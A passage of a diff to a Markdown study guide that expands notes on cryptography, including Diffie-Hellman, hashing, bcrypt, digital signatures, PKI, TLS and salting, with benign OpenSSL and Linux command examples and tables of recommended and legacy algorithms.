+The `prime256v1` curve is also commonly referred to as **secp256r1**.
+
+#### Diffie-Hellman (DH)
+
+Diffie-Hellman is primarily a **key-agreement protocol**, not an encryption algorithm.
+
+It allows two parties to establish a shared secret over an insecure network without directly transmitting the secret itself.
+
+Simplified:
+
+```text
+Alice                          Bob
+  │                             │
+  │──── Public information ─────│
+  │                             │
+  │   Calculate shared secret   │
+  │                             │
+  └──────── Same secret ────────┘
+```
+
+An attacker may observe the exchanged public information but should not be able to practically calculate the resulting shared secret when appropriate parameters are used.
+
+**Linux/OpenSSL example:**
+
+Generate DH parameters:
+
+```bash
+openssl dhparam -out dhparam.pem 2048
+```
+
+This creates Diffie-Hellman parameters that can be used by applications supporting DH.
+
+Modern TLS commonly uses **ephemeral Diffie-Hellman variants**, such as ECDHE, to provide forward secrecy.
 
 #### Hashing
-A one-way function that converts data into a fixed-length digest; used for integrity verification, not encryption (cannot be reversed). Examples: SHA-256, MD5 (weak/deprecated), bcrypt (for passwords).
+
+Hashing converts input data into a **fixed-length digest**.
+
+```text
+Input
+  ↓
+Hash Function
+  ↓
+Fixed-Length Digest
+```
+
+A cryptographic hash function should make it computationally infeasible to:
+
+* Recover the original input from the hash.
+* Find another input producing the same hash.
+* Modify the input without changing the resulting digest.
+
+Hashing is **not encryption** because there is normally no decryption operation.
+
+Common examples:
+
+| Algorithm | Status                                   | Common use                               |
+| --------- | ---------------------------------------- | ---------------------------------------- |
+| SHA-256   | Secure for general cryptographic hashing | Integrity, signatures, checksums         |
+| SHA-512   | Secure for general cryptographic hashing | Integrity and cryptographic applications |
+| MD5       | Broken for collision resistance          | Legacy checksums only                    |
+| SHA-1     | Broken for collision resistance          | Legacy systems                           |
+| bcrypt    | Password hashing                         | Password storage                         |
+
+##### SHA-256
+
+SHA-256 produces a **256-bit digest**, normally represented as 64 hexadecimal characters.
+
+Example:
+
+```bash
+echo -n "hello" | sha256sum
+```
+
+The command:
+
+* `echo -n "hello"` → outputs `hello` without a newline.
+* `|` → sends the output to the next command.
+* `sha256sum` → calculates the SHA-256 digest.
+
+To hash a file:
+
+```bash
+sha256sum secret.txt
+```
+
+This is useful for checking whether a file has changed.
+
+For example:
+
+```text
+Original file
+     ↓
+SHA-256
+     ↓
+ABC123...
+
+File received
+     ↓
+SHA-256
+     ↓
+ABC123...
+```
+
+If both digests match, the files have the same content with extremely high probability.
+
+##### MD5
+
+MD5 produces a 128-bit digest but is **not considered secure for cryptographic integrity or signatures** because practical collision attacks exist.
+
+Linux command:
+
+```bash
+md5sum secret.txt
+```
+
+MD5 may still appear in legacy systems or non-security-sensitive file identification, but it should not be selected for new security designs.
+
+##### bcrypt
+
+bcrypt is specifically designed for **password hashing**.
+
+Unlike a fast hash such as SHA-256, bcrypt is intentionally computationally expensive, making large-scale password guessing more difficult.
+
+Example:
+
+```bash
+htpasswd -bnBC 12 "" 'MyPassword' | tr -d ':\n'
+```
+
+This can generate a bcrypt password hash when the Apache `htpasswd` utility is installed.
+
+The `12` is the bcrypt **cost factor**.
+
+> For new password-storage systems, modern password-hashing choices may also include Argon2id, depending on application support.
 
 #### Digital Signatures
-Uses a sender's private key to sign data and the corresponding public key to verify it, ensuring authenticity, integrity, and non-repudiation.
+
+A digital signature proves that data was signed by someone possessing a particular **private key** and that the signed data has not been altered.
+
+Simplified process:
+
+```text
+Message
+   ↓
+Hash
+   ↓
+Sign hash with Private Key
+   ↓
+Digital Signature
+```
+
+The receiver uses the corresponding public key to verify the signature.
+
+```text
+Message + Signature
+        ↓
+ Public Key
+        ↓
+ Verify
+        ↓
+Valid / Invalid
+```
+
+Digital signatures provide:
+
+* **Authentication** — identifies the holder of the private key.
+* **Integrity** — detects changes to the signed data.
+* **Non-repudiation** — provides evidence that the private-key holder created the signature, subject to the surrounding key-management and legal context.
+
+**Linux/OpenSSL example:**
+
+Generate a signature:
+
+```bash
+openssl dgst -sha256 -sign private.key -out signature.bin secret.txt
+```
+
+Verify it:
+
+```bash
+openssl dgst -sha256 -verify public.key -signature signature.bin secret.txt
+```
+
+If the signature matches, OpenSSL reports:
+
+```text
+Verified OK
+```
+
+If the file is modified after signing, verification fails.
 
 #### PKI (Public Key Infrastructure)
-A framework of policies, roles, and systems (Certificate Authorities, digital certificates, registration authorities) used to manage public-key encryption and verify identities.
+
+PKI is the larger framework used to **create, distribute, manage, validate, and revoke digital certificates and public keys**.
+
+PKI commonly involves:
+
+* **Certificate Authority (CA)** — trusted organization that issues certificates.
+* **Root CA** — trust anchor at the top of a certificate chain.
+* **Intermediate CA** — issues certificates on behalf of a root CA.
+* **Registration Authority (RA)** — helps validate certificate requests/identities.
+* **Digital certificates** — bind identities to public keys.
+* **Certificate revocation mechanisms** — such as CRLs and OCSP.
+
+A simplified hierarchy:
+
+```text
+Root CA
+   ↓
+Intermediate CA
+   ↓
+Server Certificate
+   ↓
+example.com
+```
+
+When a browser connects to a secure website, it can validate the server's certificate against trusted CA certificates.
 
 #### Digital Certificates
-Issued by a trusted Certificate Authority (CA), binding a public key to an entity's identity, used to establish trust (e.g., SSL/TLS certificates for websites).
+
+A digital certificate is an electronic document that binds a **public key to an identity**.
+
+A typical TLS certificate contains information such as:
+
+* Subject/domain information
+* Public key
+* Issuer
+* Validity period
+* Serial number
+* Signature from the issuing CA
+* Subject Alternative Names (SANs)
+
+Example:
+
+```text
+example.com
+     ↓
+Certificate
+     ↓
+Public Key
+     ↓
+Signed by CA
+```
+
+The CA's digital signature allows clients to verify that the certificate was issued by a trusted authority.
+
+**Inspect a certificate:**
+
+```bash
+openssl x509 -in certificate.crt -text -noout
+```
+
+This displays certificate details in human-readable form.
+
+For a live HTTPS server:
+
+```bash
+openssl s_client -connect example.com:443 -servername example.com
+```
+
+This establishes a TLS connection and displays certificate/TLS information.
 
 #### SSL/TLS
-Protocols that encrypt data in transit between a client and server. TLS is the modern, secure successor to SSL. Establishes a secure session through a TLS handshake (certificate exchange, key negotiation).
+
+**TLS (Transport Layer Security)** protects data transmitted between applications over a network.
+
+SSL is the older predecessor to TLS and is **obsolete and insecure**. Modern systems should use TLS.
+
+TLS provides:
+
+* Encryption
+* Integrity
+* Server authentication
+* Optional client authentication
+
+A simplified TLS connection:
+
+```text
+Client
+  │
+  │ ClientHello
+  ↓
+Server
+  │
+  │ Certificate + TLS parameters
+  ↓
+Client
+  │
+  │ Key agreement
+  ↓
+Secure encrypted session
+```
+
+The exact handshake differs by TLS version and negotiated cipher suite, but modern TLS generally uses asymmetric cryptography for authentication and/or key agreement and symmetric cryptography for efficient bulk encryption.
+
+**Common port:**
+
+```text
+HTTPS → TCP 443
+```
+
+Inspect a TLS server:
+
+```bash
+openssl s_client -connect example.com:443 -servername example.com
+```
+
+Useful information can include:
+
+* Certificate chain
+* TLS version
+* Negotiated cipher
+* Server certificate
+* Connection details
+
+Check supported TLS versions/ciphers with tools such as:
+
+```bash
+openssl ciphers -v
+```
 
 #### Salting
-Adding random data to a password before hashing to defend against precomputed rainbow-table attacks.
 
-### Symmetric vs Asymmetric
-| Symmetric | Asymmetric |
-|---|---|
-| One shared key | Public/private key pair |
-| Faster | Slower |
-| Key distribution challenge | Solves key distribution |
-| AES, DES | RSA, ECC |
+A **salt** is random data added to a password before password hashing.
+
+Without salting:
+
+```text
+Password
+   ↓
+Hash
+   ↓
+Same password → Same hash
+```
+
+With salting:
+
+```text
+Password + Random Salt
+          ↓
+       Hashing
+          ↓
+       Password Hash
+```
+
+Different users with the same password should therefore have different stored password hashes.
+
+Example:
+
+```text
+User A:
+Password + Salt A → Hash A
+
+User B:
+Password + Salt B → Hash B
+```
+
+Salting helps defend against:
+
+* Precomputed rainbow tables
+* Simple hash lookup attacks
+* Identical hashes revealing identical passwords
+
+A salt does **not** need to be secret. It is normally stored alongside the password hash.
+
+Password-hashing algorithms such as **bcrypt, scrypt, and Argon2** automatically incorporate salts as part of their normal operation.
+
+#### Encryption vs Hashing vs Encoding
+
+These concepts are often confused.
+
+| Technique         | Reversible?                  | Uses Key?          | Main Purpose               |
+| ----------------- | ---------------------------- | ------------------ | -------------------------- |
+| Encryption        | Yes                          | Yes                | Confidentiality            |
+| Hashing           | No                           | No                 | Integrity / fingerprinting |
+| Encoding          | Yes                          | No                 | Data representation        |
+| Digital Signature | Verification, not decryption | Private/public key | Authenticity + integrity   |
+
+Example:
+
+```text
+Encryption:
+"hello" → encrypted data → "hello"
+
+Hashing:
+"hello" → SHA-256 → digest
+
+Encoding:
+"hello" → Base64 → "aGVsbG8="
+```
+
+**Base64 is not encryption.** Anyone can decode it.
+
+Linux example:
+
+```bash
+echo -n "hello" | base64
+```
+
+Decode:
+
+```bash
+echo -n "aGVsbG8=" | base64 -d
+```
+
+#### Symmetric vs Asymmetric
+
+| Symmetric                                  | Asymmetric                                |
+| ------------------------------------------ | ----------------------------------------- |
+| One shared secret key                      | Public/private key pair                   |
+| Same secret used for encryption/decryption | Different but mathematically related keys |
+| Very fast                                  | Slower                                    |
+| Good for bulk data                         | Good for authentication/key exchange      |
+| Key distribution is challenging            | Public key can be shared                  |
+| AES                                        | RSA, ECC                                  |
+| Used for bulk TLS encryption               | Used for TLS authentication/key agreement |
+
+#### Common Cryptography Algorithms
+
+| Category             | Examples                | Main Purpose                 |
+| -------------------- | ----------------------- | ---------------------------- |
+| Symmetric encryption | AES                     | Encrypt bulk data            |
+| Legacy symmetric     | DES, 3DES               | Legacy systems               |
+| Asymmetric           | RSA                     | Encryption/signatures        |
+| Asymmetric           | ECC                     | Signatures/key agreement     |
+| Key agreement        | DH, ECDH                | Establish shared secrets     |
+| Hashing              | SHA-256, SHA-512        | Integrity/fingerprinting     |
+| Legacy hashing       | MD5, SHA-1              | Legacy/non-security uses     |
+| Password hashing     | bcrypt, Argon2id        | Secure password storage      |
+| Digital signature    | RSA-PSS, ECDSA, Ed25519 | Authentication/integrity     |
+| Transport security   | TLS                     | Secure network communication |
+
+#### Useful Linux Cryptography Commands
+
+| Command                                                       | Purpose                                 |
+| ------------------------------------------------------------- | --------------------------------------- |
+| `openssl version`                                             | Show OpenSSL version                    |
+| `sha256sum file`                                              | Calculate SHA-256 hash                  |
+| `sha512sum file`                                              | Calculate SHA-512 hash                  |
+| `md5sum file`                                                 | Calculate MD5 hash                      |
+| `openssl rand -hex 32`                                        | Generate 32 random bytes as hexadecimal |
+| `openssl genrsa -out private.key 2048`                        | Generate RSA private key                |
+| `openssl rsa -in private.key -pubout`                         | Extract RSA public key                  |
+| `openssl ecparam -name prime256v1 -genkey -noout -out ec.key` | Generate EC private key                 |
+| `openssl x509 -in cert.crt -text -noout`                      | Inspect certificate                     |
+| `openssl dgst -sha256 -sign private.key -out sig file`        | Create digital signature                |
+| `openssl dgst -sha256 -verify public.key -signature sig file` | Verify digital signature                |
+| `openssl s_client -connect host:443`                          | Inspect a TLS connection                |
+| `openssl ciphers -v`                                          | List available cipher suites            |
+| `openssl rand -base64 32`                                     | Generate random data                    |
+| `base64 file`                                                 | Encode data using Base64                |
+| `base64 -d file`                                              | Decode Base64 data                      |
+
+> **Security note:** For new systems, prefer modern algorithms and constructions such as **AES-GCM/ChaCha20-Poly1305, SHA-256/SHA-512 where appropriate, Ed25519/ECDSA, modern TLS, and Argon2id/bcrypt for passwords**. Avoid DES, 3DES, MD5, SHA-1, SSL, and direct password-based encryption schemes unless you are specifically dealing with legacy systems.
 
 ---
 
